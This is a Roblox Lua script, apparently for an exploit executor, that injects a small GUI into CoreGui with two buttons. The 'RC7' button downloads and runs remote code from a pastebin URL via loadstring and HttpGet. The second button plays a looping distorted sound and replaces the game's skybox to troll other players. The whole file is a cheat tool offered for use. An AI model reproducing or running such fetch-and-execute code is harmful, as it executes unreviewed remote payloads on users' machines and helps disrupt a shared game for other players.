local ScreenGui = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local label = Instance.new("TextLabel")
local Hitbox = Instance.new("TextButton")
local SkyButton = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui

main.Name = "main"
main.Parent = ScreenGui
main.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
main.Position = UDim2.new(0.40427351, 0, 0.34591195, 0)
main.Size = UDim2.new(0, 115, 0, 100) -- Increased height to accommodate the new button
main.Active = true
main.Draggable = true

label.Name = "label"
label.Parent = main
label.BackgroundColor3 = Color3.fromRGB(139,0,0)
label.Size = UDim2.new(0, 114, 0, 20)
label.Font = Enum.Font.SourceSans
label.Text = "Fe GRUPO"
label.TextColor3 = Color3.fromRGB(0, 0, 0)
label.TextScaled = true
label.TextSize = 4.000
label.TextWrapped = true

Hitbox.Name = "Hit box"
Hitbox.Parent = main
Hitbox.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
Hitbox.Position = UDim2.new(0.114285722, 0, 0.372448981, 0)
Hitbox.Size = UDim2.new(0, 90, 0, 40)
Hitbox.Font = Enum.Font.SourceSans
Hitbox.Text = "RC7"
Hitbox.TextColor3 = Color3.fromRGB(0, 0, 0)
Hitbox.TextSize = 15.000
Hitbox.MouseButton1Down:Connect(function()
    loadstring(game:HttpGet("https://pastebin.com/raw/5bNDes7i"))()
end)

SkyButton.Name = "Pantalla en el cielo"
SkyButton.Parent = main
SkyButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0) -- Green color
SkyButton.Position = UDim2.new(0.114285722, 0, 0.572448981, 0)
SkyButton.Size = UDim2.new(0, 90, 0, 30)
SkyButton.Font = Enum.Font.SourceSans
SkyButton.Text = "Pantalla en el cielo"
SkyButton.TextColor3 = Color3.fromRGB(0, 0, 0)
SkyButton.TextSize = 14.000
SkyButton.MouseButton1Down:Connect(function()
    -- Tu cÃ³digo para cambiar el cielo aquÃ­
    local sound = Instance.new("Sound", workspace)
    sound.Name = "Noooooooooooooooot noooooooooooooooooooooooot"
    sound.SoundId = "rbxassetid://6129291390"
    sound:Play()
    sound.Looped = true
    repeat
        wait(0.01)
    until sound.IsLoaded == true
    wait(13)

    local de = Instance.new("DistortionSoundEffect", sound)
    de.Level = 0.8

    local lighting = game:GetService("Lighting")
    local sky = Instance.new("Sky", lighting)
    sky.SkyboxBk = "rbxassetid://17294509169"
    sky.SkyboxFt = "rbxassetid://17294509169"
    sky.SkyboxLf = "rbxassetid://17294509169"
    sky.SkyboxRt = "rbxassetid://17294509169"
    sky.SkyboxUp = "rbxassetid://17294509169"
end)